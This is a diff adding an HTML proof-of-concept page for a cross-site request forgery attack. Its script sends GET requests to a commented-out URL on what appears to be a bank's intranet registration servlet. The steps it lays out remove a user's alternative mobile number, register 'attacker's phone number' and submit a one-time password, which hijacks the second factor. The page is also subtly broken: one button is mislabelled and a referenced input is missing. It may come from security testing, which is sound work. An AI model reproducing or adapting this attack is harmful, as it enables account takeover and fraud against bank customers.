@@ -1,0 +1,53 @@
+<html>
+    <head>
+        <h1>My Security CSRF Test</h1>
+    </head>
+    <script>
+        function deleteNumber() {
+            var param = 'phone=&action=KSNS_ALTMOV_ACTION_BORRADO';
+            get('delete number', param);
+        }
+
+        function addNumber() {
+            var num = document.getElementById('number').value;
+            var param = 'phone='+num+'&checkbox-btns-sprite=on&altmovnew=0034'+num+'&action=KSNS_ALTMOV_ACTION_ALTA';
+            get('add number', param);
+        }
+
+        function sendOTP() {
+            var otp = document.getElementById('otp').value;
+            var param = 'idClave='+otp+'&otp='+otp+'&action=KSNS_ALTMOV_ACTION_OTP';
+            get('send otp', param);
+        }
+
+        function get(msg, param) {
+
+            //var url = 'https://portalintranet.es.igrupobbva/KSNSH/ksns_mult_web/RegistroAlterMovilServlet?' + param;
+            var url = 'https://google.es?' + param;
+
+            var xhr = new XMLHttpRequest();
+            xhr.open("GET", url, true);
+            xhr.onload = function () {
+                if (xhr.readyState == 4 && xhr.status == "200") {
+                    console.log("success: "+msg);
+                } else {
+                    console.log("error: "+ msg);
+                }
+            }
+            xhr.send();        
+        }
+//document.getElementById("otp").value
+    </script>
+    <body>
+
+	    <h3>First we remove current alternative number (OPTIONAL STEP)</h3>
+	    <button  type="button" onclick="deleteNumber()">Delete phone number</button>
+
+	    <h3>Now we add attacker's phone number</h3>
+	    <button  type="button" onclick="addNumber()">Delete phone number</button>
+        
+	    <h3>Now we send the OTP</h3>
+        <input type=text id="otp">
+	    <button  type="button" onclick="sendOTP()">Send OTP</button>
+    </body>
+</html>
